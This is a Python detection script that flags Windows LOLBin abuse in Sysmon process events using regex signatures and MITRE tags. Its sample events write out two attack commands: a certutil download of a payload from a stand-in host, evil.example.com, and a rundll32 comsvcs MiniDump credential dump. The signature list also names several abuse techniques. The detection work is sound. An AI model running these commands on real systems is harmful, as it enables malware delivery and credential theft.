# Sysmon LOLBin Abuse Analysis

```python
import json
import re
from datetime import datetime, timedelta
from collections import defaultdict
from pathlib import Path

# Known LOLBins and their suspicious command-line indicators
LOLBIN_SIGNATURES = {
    "certutil.exe": {
        "suspicious_args": [
            r"-urlcache\s+-f\s+http",
            r"-decode\s+",
            r"-encode\s+",
            r"-verifyctl\s+.*http",
        ],
        "mitre": "T1218, T1105",
        "severity": "high"
    },
    "mshta.exe": {
        "suspicious_args": [
            r"https?://",
            r"vbscript:",
            r"javascript:",
            r"about:",
        ],
        "mitre": "T1218.005",
        "severity": "high"
    },
    "rundll32.exe": {
        "suspicious_args": [
            r"javascript:",
            r"shell32\.dll.*ShellExec_RunDLL",
            r"\\\\.*\\.*\.dll",  # UNC path DLL loading
            r"comsvcs\.dll.*MiniDump",  # LSASS dump via comsvcs
        ],
        "mitre": "T1218.011",
        "severity": "critical"
    },
    "regsvr32.exe": {
        "suspicious_args": [
            r"/s\s+/n\s+/u\s+/i:",
            r"scrobj\.dll",
            r"https?://",
        ],
        "mitre": "T1218.010",
        "severity": "critical"
    },
    "bitsadmin.exe": {
        "suspicious_args": [
            r"/transfer\s+.*https?://",
            r"/create\s+.*\/addfile\s+.*https?://",
            r"/SetNotifyCmdLine",
        ],
        "mitre": "T1197",
        "severity": "high"
    },
    "wmic.exe": {
        "suspicious_args": [
            r"process\s+call\s+create",
            r"/node:",
            r"os\s+get\s+/format:.*https?://",
            r"xsl.*https?://",
        ],
        "mitre": "T1047",
        "severity": "high"
    },
    "msbuild.exe": {
        "suspicious_args": [
            r"\.xml\b",
            r"\.csproj\b",
            r"\\temp\\",
            r"\\appdata\\",
        ],
        "mitre": "T1127.001",
        "severity": "high"
    },
    "mavinject.exe": {
        "suspicious_args": [
            r"/INJECTRUNNING\s+\d+",
        ],
        "mitre": "T1218.013",
        "severity": "critical"
    },
}

def analyze_sysmon_events(events):
    """Analyze Sysmon process creation events for LOLBin abuse."""
    alerts = []

    for event in events:
        image = event.get("Image", "").lower()
        cmdline = event.get("CommandLine", "")
        parent = event.get("ParentImage", "")

        # Check if the process is a known LOLBin
        for lolbin, config in LOLBIN_SIGNATURES.items():
            if image.endswith(lolbin.lower()):
                for pattern in config["suspicious_args"]:
                    if re.search(pattern, cmdline, re.IGNORECASE):
                        alert = {
                            "timestamp": event.get("UtcTime", ""),
                            "hostname": event.get("Computer", ""),
                            "lolbin": lolbin,
                            "command_line": cmdline,
                            "parent_process": parent,
                            "user": event.get("User", ""),
                            "process_id": event.get("ProcessId", ""),
                            "parent_pid": event.get("ParentProcessId", ""),
                            "mitre_technique": config["mitre"],
                            "severity": config["severity"],
                            "matched_pattern": pattern,
                        }
                        alerts.append(alert)
                        break
    return alerts

# Example usage with parsed Sysmon events
sample_events = [
    {
        "UtcTime": "2026-01-20 14:32:15.000",
        "Computer": "WORKSTATION-01",
        "Image": "C:\\Windows\\System32\\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -f http://evil.example.com/payload.exe C:\\temp\\update.exe",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "User": "CORP\\jsmith",
        "ProcessId": "4532",
        "ParentProcessId": "2108",
    },
    {
        "UtcTime": "2026-01-20 14:33:01.000",
        "Computer": "WORKSTATION-01",
        "Image": "C:\\Windows\\System32\\rundll32.exe",
        "CommandLine": "rundll32.exe comsvcs.dll, MiniDump 624 C:\\temp\\dump.bin full",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "User": "CORP\\jsmith",
        "ProcessId": "5128",
        "ParentProcessId": "2108",
    },
]

alerts = analyze_sysmon_events(sample_events)
for alert in alerts:
    print(f"[{alert['severity'].upper()}] {alert['lolbin']} on {alert['hostname']}")
    print(f"  MITRE: {alert['mitre_technique']}")
    print(f"  Command: {alert['command_line'][:120]}")
    print(f"  Parent: {alert['parent_process']}")
    print(f"  User: {alert['user']}")
    print()
```
